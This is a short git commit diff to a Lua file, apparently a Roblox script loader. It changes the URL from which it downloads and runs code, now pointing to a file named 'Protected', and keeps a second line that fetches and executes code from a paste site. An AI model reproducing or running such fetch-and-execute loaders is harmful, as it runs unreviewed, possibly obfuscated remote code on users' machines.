3cb5a8fa6d349e28d0909d13850bf3eeb19b9524
scriptjame <132070412+scriptjame@users.noreply.github.com>
2025-10-21 23:53:14 +0700

    Update test1.lua

--- test1.lua
+++ test1.lua
@@ -12,7 +12,7 @@ if old then old:Destroy() end
 
 -- ⚡ Chạy script chính trước
 pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptjame/BBall1/refs/heads/main/V3.lua"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/scriptjame/bb/refs/heads/main/Protected_2255306246000317.lua"))()
         loadstring(game:HttpGet("https://paste.debian.net/plainh/4f92347f/", true))()
 end)
 
